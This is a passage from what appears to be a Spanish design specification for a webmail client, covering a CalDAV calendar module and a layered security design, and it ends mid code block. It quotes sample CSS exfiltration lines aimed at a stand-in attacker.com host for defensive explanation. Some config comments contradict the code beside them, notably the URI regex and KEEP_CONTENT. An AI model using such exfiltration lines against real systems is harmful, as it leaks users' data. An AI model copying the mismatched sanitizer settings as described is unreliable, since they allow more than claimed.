El estado de selección de mensajes se mantiene en la store de Pinia (`emailStore`), que utiliza la arquitectura modular recomendada para aplicaciones Vue 3: auth, emails, folders, drafts, y settings como stores separadas [^99^][^105^]. La eliminación de mutaciones (comparado con Vuex), el soporte TypeScript por defecto, y la reducción de 35-45% en boilerplate hacen de Pinia la elección natural para la gestión de estado [^99^].


---

## 8. Módulo de Calendario

La integración de calendario no es un "nice-to-have" sino una necesidad competitiva. Gmail, Outlook y todo cliente de correo moderno integra invitaciones de calendario (.ics) directamente en el flujo de trabajo del email [^227^]. Webmail 6.0 implementa un módulo de calendario completo con sincronización CalDAV, UI basada en FullCalendar, detección automática de invitaciones en correos, y envío de invitaciones desde el compositor. El stack tecnológico seleccionado —tsdav + ical.js + FullCalendar— proporciona una solución completa con soporte TypeScript nativo [^190^][^197^][^130^].

### 8.1 Integración CalDAV

#### 8.1.1 tsdav: Cliente TypeScript para CalDAV/CardDAV

tsdav es la librería Node.js/TypeScript más moderna y completa para CalDAV/CardDAV: soporta WebDAV, CalDAV y CardDAV tanto en navegador como en Node.js, con autenticación OAuth2 y básica integrada, tipado TypeScript nativo, y está testeada con múltiples proveedores cloud (iCloud, Google, Fastmail, Nextcloud, Baikal). Registra aproximadamente 113,580 descargas semanales en npm y se mantiene activamente [^190^]. La librería histórica `dav` de Mozilla, que fue el pilar del ecosistema durante años, lleva 7 años sin actualizarse significativamente, posicionando a tsdav como el reemplazo de facto [^195^].

La integración de tsdav en Webmail 6.0 se realiza a través de un servicio dedicado `CalDAVService` que encapsula todas las operaciones del protocolo. Este servicio inicializa un cliente tsdav con las credenciales de la cuenta (básicas, digest u OAuth2 según el proveedor) y expone métodos para: descubrir calendarios, listar eventos, crear/actualizar/eliminar eventos, y sincronizar cambios. El soporte OAuth2 integrado de tsdav es esencial para proveedores como Google, que desde marzo de 2025 requieren OAuth2 para acceso a CalDAV [^190^][^193^].

La especificación RFC 4791 define los requisitos obligatorios para servidores CalDAV: soporte iCalendar como media type, WebDAV Class 1, WebDAV ACL (RFC 3744), transporte TLS, ETags para detección de cambios, todos los calendaring reports (`calendar-query`, `calendar-multiget`, `free-busy-query`), y advertising vía `DAV:supported-report-set` [^153^][^159^]. tsdav implementa client-side todos estos reportes, permitiendo a Webmail 6.0 operar con cualquier servidor conforme.

#### 8.1.2 ical.js (Mozilla) para RFC 5545

ical.js de Mozilla es la librería estándar para parsing y generación de iCalendar (RFC 5545) en JavaScript. Soporta jCal (RFC 7265), vCard (RFC 6350) y jCard (RFC 7095), y es la base sobre la que se construye todo el ecosistema de calendarios web [^197^]. ical.js no tiene dependencias externas, lo que reduce la superficie de ataque y simplifica el bundle.

Para casos de uso que requieren expansión robusta de reglas de recurrencia (RRULE), manejo de zonas horarias, `EXDATE` y `RECURRENCE-ID`, Webmail 6.0 complementa ical.js con `node-ical`, un fork que mejora específicamente el soporte para entornos Node.js [^189^]. Esta combinación permite parsear eventos recurrentes complejos, expandirlos a instancias individuales para visualización en el calendario, y reconstruir el iCalendar original para modificaciones.

El flujo de parsing funciona así: el servidor obtiene el iCalendar vía tsdav (`calendar-multiget`), lo parsea con ical.js extrayendo componentes `VEVENT`, `VTODO` y `VTIMEZONE`, y almacena los eventos normalizados en MongoDB con campos estructurados (`uid`, `summary`, `dtstart`, `dtend`, `rrule`, `organizer`, `attendees`, `location`, `description`, `status`). Los eventos recurrentes se expanden periódicamente mediante un job en BullMQ que genera las instancias concretas para las próximas 90 días, almacenándolas en una colección separada `calendar_instances` para consultas rápidas.

#### 8.1.3 Auto-discovery: DNS SRV + Well-Known + PROPFIND

El auto-discovery CalDAV implementa el flujo definido en RFC 6764 en tres etapas progresivas [^232^]:

**Etapa 1: DNS SRV/TXT.** El sistema consulta registros DNS `_caldavs._tcp.{dominio}` SRV para obtener el hostname y puerto del servidor CalDAV. Si existen registros TXT, estos proporcionan la ruta base del servicio.

**Etapa 2: Well-Known URLs.** Si el DNS no resuelve, el sistema intenta `GET /.well-known/caldav` en el dominio del servidor de correo, siguiendo redirecciones HTTP 301/308. Esta es la forma más común de auto-discovery en servidores modernos (Nextcloud, SOGo, Baikal).

**Etapa 3: PROPFIND manual.** Como último recurso, se ejecuta un `PROPFIND` en la URL raíz del servidor con profundidad 0, buscando la propiedad `{DAV:}current-user-principal`, que apunta a la URL del usuario actual. Desde allí, un segundo `PROPFIND` con `calendar-home-set` revela las colecciones de calendario disponibles.

El resultado del auto-discovery se cachea en Redis con TTL de 7 días para evitar latencia en conexiones subsiguientes. El usuario puede sobrescribir la URL descubierta mediante configuración manual en la interfaz de cuentas.

### 8.2 UI de Calendario

#### 8.2.1 FullCalendar: Vistas Día/Semana/Mes/Agenda

FullCalendar es el estándar de facto para componentes UI de calendario en JavaScript, con integración nativa para Vue.js vía `@fullcalendar/vue3`. Desde la versión 5.5 soporta feeds iCalendar directamente, y existe un plugin comunitario que añade soporte CalDAV como eventSource con autenticación OAuth2 [^130^][^133^][^238^][^242^].

La implementación en Webmail 6.0 utiliza FullCalendar con las siguientes configuraciones: plugin `dayGridPlugin` para vista de mes, `timeGridPlugin` para vistas de día y semana, `listPlugin` para vista de agenda, e `interactionPlugin` para selección de rangos y drag-and-drop de eventos. El header de herramientas muestra navegación (anterior/siguiente/hoy), selector de vista (mes/semana/día/agenda), y el título del período actual. El locale se adapta automáticamente según la preferencia del usuario.

Cada evento se renderiza con colores derivados del calendario padre (configurables por el usuario con selector de color de 18 tonos predefinidos). Los eventos de todo el día aparecen en la sección superior del día (all-day slot de 28px de altura). Los eventos temporales muestran su hora de inicio en formato 24h, título truncado a 2 líneas, e indicador de color del calendario como borde izquierdo de 3px. Los eventos con invitados pendientes muestran un pequeño badge de estado: amarillo `#F4B400` para "pendiente de respuesta", verde `#34A853` para "aceptado", rojo `#EA4335` para "declinado".

El calendario soporta las siguientes interacciones: clic en evento abre panel de detalle (título, horario, ubicación, descripción, lista de asistentes con estados), clic en celda vacía abre el composer de nuevo evento con la fecha/hora pre-llenada, drag-and-drop para mover eventos (con confirmación para eventos recurrentes: "¿Modificar solo esta instancia o toda la serie?"), y resize para ajustar duración de eventos temporales.

#### 8.2.2 Integración Email ↔ Calendario: Detección .ICS, Preview Aceptar/Declinar

Una de las funcionalidades diferenciadoras de Webmail 6.0 es la detección automática de invitaciones de calendario en los correos entrantes. Cuando el sistema parsea un email con PostalMime y detecta un adjunto con extensión `.ics` o tipo MIME `text/calendar`, extrae el componente `METHOD:REQUEST` o `METHOD:PUBLISH` del iCalendar y genera una tarjeta de preview in-line en el reading pane [^227^].

La tarjeta de invitación muestra: título del evento con icono de calendario, fecha y hora formateadas en el timezone local del usuario (ej: "Jueves 15 de mayo, 14:00 – 15:00 GMT-3"), ubicación con enlace a Google Maps si es una dirección física, organizador con avatar y nombre, lista de asistentes con sus estados de respuesta, y tres botones de acción primarios: "Aceptar" (verde), "Quizás" (amarillo), y "Declinar" (rojo).

Al presionar cualquiera de los botones, el sistema ejecuta el flujo iTip (RFC 5546): genera un iCalendar de respuesta con `METHOD:REPLY`, establece el `PARTSTAT` del asistente (`ACCEPTED`, `TENTATIVE`, o `DECLINED`), y envía la respuesta al organizador vía SMTP. Simultáneamente, el evento se añade/actualiza en el calendario CalDAV del usuario con el estado correspondiente. Si el usuario no tiene un calendario CalDAV configurado, el evento se almacena en un calendario local (MongoDB) con sincronización diferida cuando se configure CalDAV.

Para actualizaciones de eventos existentes (`METHOD:REQUEST` con secuencia mayor), la tarjeta muestra un badge "Actualizado" y resalta los cambios mediante diff visual: campos modificados aparecen con fondo amarillo `#FFF8E1` y un indicador de "cambio" junto al valor anterior tachado. El usuario puede aceptar la actualización o mantener la versión previa.

Para cancelaciones (`METHOD:CANCEL`), la tarjeta muestra un banner rojo `#EA4335` con texto "Este evento ha sido cancelado" y un botón "Eliminar del calendario" que remueve el evento vía CalDAV `DELETE`.

#### 8.2.3 Envío de Invitaciones: Composer + .ICS Multipart/Alternative

El envío de invitaciones desde Webmail 6.0 se integra directamente en el composer de correo. Un botón "Programar reunión" en la barra de herramientas del compositor abre un panel lateral con campos para: título del evento, fecha/hora de inicio y fin (pickers con selección de timezone del usuario), ubicación (con autocompletado de direcciones previas), y lista de asistentes (sincronizada con el módulo de contactos).

Al enviar, el sistema genera un email multipart con tres partes: `text/plain` con la descripción legible del evento, `text/html` con formato enriquecido generado desde el mismo Tiptap del composer, y `text/calendar; method=REQUEST` con el iCalendar RFC 5545 completo. El componente iCalendar incluye `UID` generado v4 UUID, `ORGANIZER` con el email de la cuenta activa, `ATTENDEE` para cada destinatario con `ROLE=REQ-PARTICIPANT;RSVP=TRUE`, y `VALARM` opcional si el usuario configuró recordatorio.

Los asistentes que usan Webmail 6.0 recibirán la tarjeta de preview con botones Aceptar/Declinar. Los que usan otros clientes (Outlook, Apple Mail, Thunderbird) recibirán la invitación estándar iCalendar que sus clientes procesarán nativamente.

### 8.3 Sincronización

#### 8.3.1 Sincronización Bidireccional: ETags + Sync-Tokens + Conflict Resolution

La sincronización bidireccional entre Webmail 6.0 y el servidor CalDAV implementa las mejores prácticas del protocolo: resolución a nivel de campo (no de ítem completo), uso de ETags para detección de cambios, sync-tokens para sincronización incremental, y establecimiento de dirección de sync por campo para minimizar conflictos [^226^].

El flujo de sincronización opera así: en cada ciclo de sync (disparado por cron cada 5 minutos o manualmente por el usuario), el backend obtiene el sync-token almacenado para el calendario y ejecuta un `sync-collection` REPORT con el token. El servidor responde con: (a) recursos modificados desde el último sync, (b) recursos eliminados, y (c) un nuevo sync-token. Para cada recurso modificado, Webmail 6.0 compara el ETag local con el remoto; si difieren, descarga el iCalendar actualizado y mergea con la versión local.

El sistema de resolución de conflictos sigue estas reglas en orden de prioridad: si el cambio es local no sincronizado aún, gana el local (dirección de sync por defecto: server → client para cambios del servidor, client → server para cambios locales). En caso de cambio simultáneo en ambos lados (doble modificación entre sincronizaciones), se aplica resolución a nivel de campo: `SUMMARY`, `DESCRIPTION` y `LOCATION` se mergean tomando el valor más reciente por timestamp; `DTSTART`, `DTEND` y `RRULE` se resuelven con estrategia "último escritor gana"; `ATTENDEES` se mergean la lista. Los conflictos no auto-resolvibles se notifican al usuario mediante un toast con opción de revisar manualmente.

Los eventos creados localmente se envían al servidor CalDAV vía `PUT` con header `If-None-Match: *` para prevenir sobrescritura. Los eventos eliminados localmente se eliminan en el servidor vía `DELETE` con el ETag correspondiente. Toda operación CalDAV se registra en un log de sync (`CalendarSyncLog`) con timestamp, dirección, operación, resultado, y ETag involucrado, facilitando debugging y auditoría.

#### 8.3.2 RRULE con ical.js

El manejo de eventos recurrentes es una de las fuentes principales de complejidad en calendarios. Webmail 6.0 utiliza ical.js para parsear las reglas `RRULE` (RFC 5545) y expandirlas a instancias individuales [^158^]. Las reglas soportadas incluyen: frecuencia (`FREQ=DAILY/WEEKLY/MONTHLY/YEARLY`), intervalo (`INTERVAL`), recuento máximo (`COUNT`), fecha de fin (`UNTIL`), días de la semana (`BYDAY`), día del mes (`BYMONTHDAY`), mes (`BYMONTH`), y posición (`BYSETPOS`).

La expansión de RRULE se ejecuta como un job en BullMQ cada noche (02:00 AM timezone del servidor), generando instancias concretas para los próximos 90 días. Este enfoque de pre-computación permite que FullCalendar cargue eventos rápidamente sin calcular recurrencias en tiempo real. Para eventos con excepciones (`EXDATE`), las instancias correspondientes se marcan como excluidas. Para modificaciones de instancias individuales (`RECURRENCE-ID`), se genera un evento override que reemplaza la instancia base en consultas.

Cuando un usuario modifica una instancia recurrente, el sistema presenta el diálogo: "¿Aplicar cambios solo a este evento o a toda la serie?". Si selecciona "solo este evento", se crea un componente `VEVENT` con `RECURRENCE-ID` apuntando a la instancia original. Si selecciona "toda la serie", se modifica la regla `RRULE` base. Esta distinción se preserva en el iCalendar sincronizado vía CalDAV.

#### 8.3.3 Timezones: IANA, Almacenamiento en UTC

El manejo de zonas horarias es uno de los mayores desafíos en calendarios: `VTIMEZONE` en ICS es notoriamente problemático entre clientes, especialmente Outlook [^155^][^156^]. Webmail 6.0 adopta la estrategia de almacenamiento en UTC con conversión a la zona horaria local del usuario para visualización.

Todos los eventos se almacenan internamente con `DTSTART` y `DTEND` en UTC (sufijo `Z`). La zona horaria del usuario se obtiene de la configuración de perfil (por defecto, la zona horaria del navegador detectada vía `Intl.DateTimeFormat().resolvedOptions().timeZone`). Para visualización, FullCalendar recibe los eventos en UTC y aplica la zona horaria local del usuario mediante el plugin `@fullcalendar/moment-timezone`.

Cuando un evento se crea o modifica, el composer de eventos muestra un selector de timezone que defaultea a la zona del usuario pero permite cambiar explícitamente. Al guardar, la fecha/hora seleccionada se convierte a UTC para almacenamiento. En el iCalendar exportado vía CalDAV o adjunto .ics, se incluye un bloque `VTIMEZONE` con la definición IANA completa para compatibilidad con clientes que requieren `VTIMEZONE` explícito (Outlook, Apple Calendar).

La base de datos de zonas horarias IANA se mantiene actualizada mediante el paquete `ical.timezones.js`, que proporciona definiciones `VTIMEZONE` para todas las zonas IANA. Este paquete se actualiza automáticamente con cada release que incorpora los cambios de la Olson TZ Database (actualizaciones por cambios de horario de verano en jurisdicciones mundiales).

| Componente | Librería / Tecnología | Versión | Función |
|------------|----------------------|---------|---------|
| Cliente CalDAV | tsdav | ^2.1.0 | Cliente TypeScript para CalDAV/CardDAV/WebDAV con OAuth2 [^190^] |
| Parser iCalendar | ical.js (Mozilla) | ^2.0.0 | Parsing/generación RFC 5545, jCal, sin dependencias [^197^] |
| Expansión RRULE | node-ical | ^0.18.0 | Fork de ical.js con expansión robusta de recurrencias [^189^] |
| UI Calendario | FullCalendar Vue 3 | ^6.1.0 | Componente calendario con vistas día/semana/mes/agenda [^130^] |
| Plugin iCal | @fullcalendar/icalendar | ^6.1.0 | Soporte nativo de feeds iCalendar en FullCalendar [^242^] |
| Timezones | ical.timezones.js | ^1.0.0 | Base de datos IANA para VTIMEZONE [^158^] |
| Auto-discovery | RFC 6764 | — | DNS SRV + well-known + PROPFIND [^232^] |
| Autenticación | OAuth 2.0 + Basic/Digest | RFC 6749 | OAuth2 para Google/iCloud, Basic para self-hosted [^152^] |
| Sync incremental | ETag + sync-token | RFC 6578 | Detección eficiente de cambios sin descarga completa [^226^] |
| Invitaciones | iTip (RFC 5546) | — | Flujo REQUEST/REPLY/CANCEL para invitaciones [^227^] |
| Colas de sync | BullMQ 5 | ^5.0.0 | Jobs de expansión RRULE y sync periódico en background |


---

## 9. Seguridad: Defensa en Capas

El historial reciente de vulnerabilidades en clientes webmail establece un escenario de amenaza que no admite compromisos. Roundcube acumuló más de 15 CVE durante el primer semestre de 2026, incluyendo explotación activa por el grupo APT28 (Fancy Bear) vinculado al Kremlin, quienes mediante la "Operación RoundPress" insertaron JavaScript malicioso en correos HTML para exfiltrar contactos, reenviar mensajes y establecer reglas Sieve persistentes que sobrevivían a cambios de contraseña [^55^]. CVE-2026-35539 demostró XSS a través de adjuntos HTML con puntuación CVSS 6.1 — bastaba con previsualizar un archivo `text/html` para que el ataque se ejecutara [^76^][^79^]. Zimbra, por su parte, mantuvo más de 10.500 servidores sin parchear ante CVE-2025-48700, una vulnerabilidad de XSS almacenado que se activaba simplemente al visualizar un correo manipulado [^51^].

Estos incidentes comparten una causa raíz común: la renderización de contenido HTML no confiable sin sanitización adecuada en múltiples capas. Webmail 6.0 aborda este problema mediante una arquitectura de defensa en profundidad que nunca depende de un único mecanismo de protección.

### 9.1 Matriz de Amenazas y Mitigaciones

La siguiente tabla consolida las ocho clases de amenaza principales identificadas para un cliente webmail moderno, con su vector de ataque, impacto estimado y las contramedidas específicas que Webmail 6.0 implementa.

| Amenaza | Vector | Impacto | Mitigación Webmail 6.0 | Referencia |
|---------|--------|---------|----------------------|------------|
| XSS via email HTML | Adjunto `text/html` o cuerpo de correo con `<script>`, handlers inline, SVG `<animate>` | Robo de sesión, keylogging, CSRF forzado | DOMPurify server-side + CSP estricto (`nonce` + `strict-dynamic`) + iframe `sandbox` | CVE-2026-35539 CVSS 6.1 [^76^]; APT28 [^55^] |
| CSS malicioso | `@import` con URL externa, selectores que exfiltran datos vía requests GET | Exfiltración de contenido, UI redressing | Juice (CSS inlining) + whitelist de propiedades permitidas, bloqueo de `@import` | Zimbra bypass [^51^] |
| Adjuntos maliciosos | Ejecutables disfrazados (.pdf.exe), macros Office, EICAR | Compromiso de endpoint, ransomware | Restricción MIME-type stricta, magic numbers, ClamAV opcional, sandbox 25 MB | CVE-2025-68461 [^54^] |
| Credenciales IMAP expuestas | Dump de base de datos, backup no cifrado | Acceso total a correos del usuario | AES-256-GCM a nivel de campo vía `mongoose-aes-encryption`, key 32 bytes, IV 12 bytes único | [^108^][^154^] |
| Secuestro de sesión | XSS que roba `localStorage`, sniffing de token JWT | Suplantación de identidad persistente | BFF pattern: access token en memoria (15 min), refresh token en HttpOnly cookie + Redis server-side | [^44^][^57^] |
| Fuerza bruta / abuso de API | Login masivo, scraping de IMAP, DoS | Bloqueo de cuentas, degradación de servicio | Redis sliding window (ZSET), 99.997% precisión, límites duales por IP y usuario | [^48^][^67^] |
| IMAP injection | CRLF en argumentos de comando IMAP, Symbol poisoning | Ejecución de comandos IMAP arbitrarios | Validación estricta con whitelist, stripping de `\r` y `\n`, uso de imapflow (no concatenación manual) | CVE-2026-42258 [^47^] |
| Subida de archivos | Bypass de extensión, path traversal, archivos gigantes | RCE, llenado de disco, hosting de malware | Límite 25 MB, magic numbers (`file-type`), nombres UUID, almacenamiento S3 aislado | OWASP [^89^] |

#### 9.1.1 XSS via email: DOMPurify server-side + CSP estricto + sandboxed iframe

El ataque XSS representa la amenaza número uno contra clientes webmail porque el contenido HTML de un correo es, por definición, no confiable. La explotación de Roundcube por APT28 utilizó etiquetas SVG `<animate>` con handlers de eventos `onbegin` que el filtro existente no detectaba, permitiendo la ejecución de JavaScript en el contexto de la sesión del usuario [^54^][^55^].

Webmail 6.0 implementa tres capas independientes de protección:

**Capa 1 — Sanitización server-side con DOMPurify.** Todo contenido HTML que transita por el backend se procesa mediante `isomorphic-dompurify` (variante de DOMPurify que funciona en Node.js a través de `jsdom`, no `happy-dom` por diferencias en el parsing de HTML que podrían introducir bypasses). DOMPurify, mantenido por Cure53, opera creando un nodo DOM, dejando que el navegador (o jsdom) parsee el HTML, y luego recorriendo el árbol DOM para eliminar elementos y atributos peligrosos [^69^][^64^]. Es fundamentalmente más seguro que enfoques basados en expresiones regulares porque aprovecha el parser del navegador, evitando técnicas de obfuscación que engañan a regex.

La configuración para el pipeline de email restringe drásticamente los elementos permitidos:

```javascript
import DOMPurify from 'isomorphic-dompurify';

const EMAIL_CONFIG = {
  ALLOWED_TAGS: [
    'p', 'br', 'strong', 'em', 'u', 's', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
    'ul', 'ol', 'li', 'a', 'img', 'table', 'thead', 'tbody', 'tr', 'td', 'th',
    'div', 'span', 'blockquote', 'pre', 'code', 'hr', 'sup', 'sub', 'center'
  ],
  ALLOWED_ATTR: [
    'href', 'title', 'alt', 'src', 'width', 'height', 'style', 'colspan',
    'rowspan', 'align', 'valign', 'bgcolor', 'color', 'face', 'size'
  ],
  ALLOW_DATA_ATTR: false,
  SANITIZE_DOM: true,
  // Permitir solo URLs http/https/mailto/cid en enlaces e imágenes
  ALLOWED_URI_REGEXP: /^(?:(?:(?:f|ht)tps?|mailto|tel|callto|cid|blob|chrome|x-moz-|ms-appx|ms-appx-web|\/\/|\/|[^a-z]|[a-z+.\-]+(?:[^a-z+.\-:]|$))/i,
  // Eliminar todo contenido de <script> y <style> antes del parsing
  KEEP_CONTENT: true
};

const clean = DOMPurify.sanitize(untrustedHtml, EMAIL_CONFIG);
```

DOMPurify elimina elementos como `<script>`, `<iframe>`, `<object>`, `<embed>`, `<form>`, y event handlers inline (`onclick`, `onerror`, `onload`, `onbegin` en SVG). Sin embargo, CVE-2025-15599 demostró que incluso DOMPurify puede tener bypasses, lo que justifica las capas adicionales [^53^].

**Capa 2 — Content Security Policy estricta con nonces.** La respuesta HTTP que entrega el contenido del email incluye headers CSP que previenen la ejecución de scripts incluso si un atacante logra inyectar JavaScript que DOMPurify no detectó:

```
Content-Security-Policy: default-src 'none'; script-src 'nonce-{random}' 'strict-dynamic'; style-src 'nonce-{random}' 'unsafe-inline'; img-src 'self' cid: data: https:; font-src 'none'; object-src 'none'; base-uri 'none'; frame-ancestors 'self'; form-action 'none'
```

El nonce es un valor criptográficamente aleatorio de 128 bits generado por el backend para cada respuesta, inyectado en las etiquetas `<style>` legítimas del email renderizado. Un atacante no puede predecir el nonce, por lo que cualquier `<script>` inyectado no cumple la directiva `script-src` y el navegador lo bloquea [^109^][^115^]. La directiva `strict-dynamic` permite que scripts confiados (los que tienen el nonce) carguen otros scripts dinámicamente sin restricciones adicionales, simplificando la gestión de dependencias.

**Capa 3 — Sandboxed iframe.** El contenido HTML del correo se renderiza dentro de un `<iframe sandbox="allow-same-origin">` con atributo `srcdoc`. El atributo `sandbox` desactiva por defecto: scripts, formularios, popups, modales, el API de permisos y el acceso al storage del parent. Incluso si el CSP fallara y DOMPurify dejara pasar un `<script>`, el sandbox del iframe previene la ejecución en el contexto de la aplicación principal [^79^][^113^].

#### 9.1.2 CSS malicioso: Juice + whitelist CSS

Los estilos CSS pueden servir como canal de exfiltración de datos. Un atacante puede usar selectores como `input[value^="a"] { background: url(https://attacker.com/leak?a) }` para extraer carácter por carácter el valor de campos de formulario, o `@import url("https://attacker.com/tracker.css")` para registrar la apertura de un correo desde una IP específica.

Webmail 6.0 utiliza **Juice** para inlinear CSS antes de la sanitización. Juice convierte reglas CSS en atributos `style` inline, que luego son filtradas por DOMPurify. Posteriormente, un segundo paso de filtrado elimina propiedades CSS potencialmente peligrosas:

```javascript
const ALLOWED_CSS_PROPS = new Set([
  'color', 'background-color', 'font-family', 'font-size', 'font-weight',
  'font-style', 'text-decoration', 'text-align', 'line-height', 'margin',
  'padding', 'border', 'width', 'height', 'max-width', 'display',
  'vertical-align', 'border-collapse', 'border-spacing'
]);
// Bloquear: @import, behavior, -moz-binding, expression(), url() con HTTP
```

Juice es el estándar de facto para CSS inlining en correos electrónicos, requerido porque la mayoría de clientes de email ignoran o eliminan hojas de estilo externas y `<style>` blocks [^121^][^117^].

#### 9.1.3 Adjuntos: restricción MIME, magic numbers, ClamAV opcional

Los adjuntos representan un vector de propagación de malware directo. La estrategia de Webmail 6.0 se basa en múltiples capas de validación aplicadas en secuencia estricta:

1. **Validación declarativa del nombre de archivo:** El backend rechaza archivos con extensiones de riesgo conocido: `.exe`, `.dll`, `.bat`, `.cmd`, `.sh`, `.js`, `.vbs`, `.ps1`, `.jar`, `.apk`, `.scr`, `.com`, `.msi`. Las extensiones dobles (`.pdf.exe`) se detectan inspeccionando el último componente separado por punto.

2. **Verificación de magic numbers:** La librería `file-type` lee los primeros bytes del archivo y compara su firma mágica contra el MIME-type declarado. Un archivo que declara `Content-Type: application/pdf` pero cuyos primeros bytes comienzan con `MZ` (ejecutable Windows) se rechaza inmediatamente.

3. **Restricción de tamaño:** Límite absoluto de 25 MB por archivo, configurable por instancia. Este límite alinea con las restricciones de los principales proveedores de email (Gmail impone 25 MB para adjuntos no-BASE64).

4. **Escaneo antivirus opcional (ClamAV):** Cuando está habilitado, los adjuntos se escanean vía `clamd` (daemon ClamAV) antes de almacenarse. ClamAV soporta formatos de archivo, archivos comprimidos (ZIP, TAR, GZIP, BZIP2), ejecutables (ELF, PE) y documentos de Office [^59^][^65^]. La cadena de prueba EICAR sirve para validar la integridad del pipeline de escaneo sin utilizar malware real.

#### 9.1.4 Credenciales IMAP: AES-256-GCM en reposo

Las credenciales IMAP (contraseñas y tokens OAuth2) se almacenan en MongoDB cifradas con AES-256-GCM (Galois/Counter Mode), un algoritmo de cifrado autenticado (AEAD) que proporciona tanto confidencialidad como integridad. El módulo `crypto` de Node.js implementa AES-256-GCM nativamente [^108^][^118^].

Webmail 6.0 utiliza el plugin `mongoose-aes-encryption`, que cifra transparentemente campos designados del schema antes de persistirlos [^154^]:

```javascript
import createAESPlugin from 'mongoose-aes-encryption';

const plugin = createAESPlugin({
  key: Buffer.from(process.env.IMAP_CREDENTIALS_KEY, 'hex') // 32 bytes
});

const accountSchema = new Schema({
  email: { type: String, required: true },
  imapHost: { type: String, required: true },
  imapPort: { type: Number, default: 993 },
  imapPassword: { type: String, encrypted: true },
  oauth2AccessToken: { type: String, encrypted: true },
  oauth2RefreshToken: { type: String, encrypted: true },
});
accountSchema.plugin(plugin, { fields: ['imapPassword', 'oauth2AccessToken', 'oauth2RefreshToken'] });
```

Los parámetros criptográficos son críticos: la clave debe tener exactamente 32 bytes (256 bits), generada con `crypto.randomBytes(32)` y almacenada en una variable de entorno o KMS. El IV (vector de inicialización) debe ser único por operación de cifrado, tener 12 bytes para GCM, y generarse con `crypto.randomBytes(12)`. Reutilizar un IV con la misma clave en GCM compromete completamente la confidencialidad del cifrado [^119^].

#### 9.1.5 Sesiones: JWT 15 min + refresh en Redis/HttpOnly cookies

El patrón de autenticación sigue el estándar Backend-for-Frontend (BFF) que Auth0, Clerk, Supabase y la mayoría de proveedores de autenticación modernos han adoptado como consenso en 2026 [^44^][^57^]:

- **Access Token:** JWT firmado con RS256 (par de claves RSA-2048), tiempo de vida 15 minutos, almacenado exclusivamente en memoria del frontend (variable JavaScript, nunca `localStorage`). Se transmite en el header `Authorization: Bearer <token>`. Al cerrar o refrescar la página, el access token desaparece y debe recuperarse mediante un silent refresh.

- **Refresh Token:** Token opaco de 128 bits (no JWT), tiempo de vida 7 días, almacenado server-side en Redis con TTL automático (SETEX). Se entrega al cliente en una cookie HTTP-only, Secure, SameSite=Strict, con scope limitado al endpoint `/auth/refresh`:

```
Set-Cookie: refresh_token=<opaque_token>; HttpOnly; Secure; SameSite=Strict; Path=/auth/refresh; Max-Age=604800
```

Este diseño mitiga XSS de manera efectiva: un script malicioso no puede leer el refresh token porque es HttpOnly, y no puede extraer el access token de localStorage porque nunca se almacena allí [^44^].

#### 9.1.6 Rate limiting: Redis sliding window 99.997% precisión

Los endpoints de autenticación e IMAP son objetivos prioritarios para ataques de fuerza bruta. Webmail 6.0 implementa rate limiting distribuido mediante Redis Sorted Sets (ZSET) usando el algoritmo sliding window, que según pruebas de Cloudflare alcanza un 99.997% de precisión con un consumo de memoria drásticamente inferior al de un log completo [^48^][^67^].

El algoritmo opera como sigue: cada petición se registra en un ZSET con el timestamp como score. Antes de aceptar una nueva petición, se ejecuta `ZREMRANGEBYSCORE` para eliminar entradas anteriores al inicio de la ventana temporal, y `ZCARD` para contar las peticiones dentro de la ventana actual. Si el conteo excede el límite, la petición se rechaza con código 429 [^156^].

La configuración de Fastify utiliza el plugin `@fastify/rate-limit` con backend Redis:

```javascript
await fastify.register(import('@fastify/rate-limit'), {
  max: 100,              // 100 requests por ventana
  timeWindow: '1 minute',
  redis: redisClient,    // Instancia ioredis
  keyGenerator: (req) => `${req.ip}:${req.user?.id || 'anonymous'}`,
  errorResponseBuilder: (req, context) => ({
    statusCode: 429,
    error: 'Too Many Requests',
    retryAfter: context.after
  })
});
```

Los límites específicos por endpoint son: login (5 intentos/minuto por IP), refresh token (10/minuto por usuario), IMAP fetch (200/minuto por cuenta), búsqueda (60/minuto por usuario).

#### 9.1.7 IMAP injection: validación estricta, stripping CRLF

La inyección de comandos IMAP ocurre cuando input del usuario se concatena directamente en comandos IMAP sin sanitización. CVE-2026-42258 en la librería `net-imap` de Ruby demostró que caracteres `\r\n` (CRLF) embebidos en argumentos de tipo Symbol permitían inyectar comandos IMAP arbitrarios, como `DELETE` o `RENAME`, con los privilegios de la cuenta comprometida [^47^].

Webmail 6.0 mitiga este riesgo en tres frentes: (1) toda interacción IMAP pasa por `imapflow`, que nunca expone concatenación manual de comandos [^1^]; (2) toda entrada de usuario que eventualmente se use en parámetros IMAP pasa por validación de whitelist que rechaza caracteres no alfanuméricos excepto puntos, guiones y arrobas en direcciones de email; (3) un paso de stripping elimina explícitamente todos los caracteres `\r` (0x0D) y `\n` (0x0A) antes de cualquier operación IMAP [^50^].

#### 9.1.8 Subida de archivos: límite 25MB, magic numbers

El endpoint de subida de archivos aplica las siguientes restricciones: tamaño máximo 25 MB (configurable), validación de magic numbers contra la extensión declarada, renombrado a UUID v4 para eliminar path traversal en nombres de archivo, almacenamiento en bucket S3 aislado sin capacidad de ejecución, y firma SHA-256 calculada en stream para detectar corrupción o manipulación durante la transferencia.

### 9.2 Arquitectura de Autenticación BFF

El patrón Backend-for-Frontend (BFF) se ha consolidado en 2026 como el estándar de seguridad para SPAs que manejan datos sensibles. A diferencia del modelo tradicional donde tanto access como refresh tokens se almacenan en `localStorage` (vulnerable a XSS), el BFF almacena solo el access token en memoria volátil y mantiene el refresh token en una cookie HttpOnly inaccesible para JavaScript [^44^][^57^].

#### 9.2.1 Access token 15-30 min en memoria

El frontend almacena el JWT access token en una variable JavaScript (por ejemplo, en un closure o módulo ES6 no exportado). Este token tiene las siguientes características: algoritmo de firma RS256 con clave privada en el backend y clave pública rotativa; claims estándar (`sub`, `iat`, `exp`, `jti`) más claims de aplicación (`accountId`, `email`); tiempo de vida 15 minutos (900 segundos); claim `jti` (JWT ID) único por token para permitir revocación puntual.

Al refrescar la página, el access token se pierde. El frontend ejecuta automáticamente un "silent refresh": realiza una petición POST al endpoint `/auth/refresh` con la cookie HttpOnly que contiene el refresh token. Si el refresh token es válido y no ha sido revocado, el backend emite un nuevo par de tokens.

#### 9.2.2 Refresh token 7-14 días server-side Redis, HTTP-only cookie

El refresh token es un token opaco de 128 bits generado con `crypto.randomBytes(16).toString('hex')`. Su ciclo de vida se gestiona completamente en el backend:

```javascript
// Almacenamiento en Redis con TTL
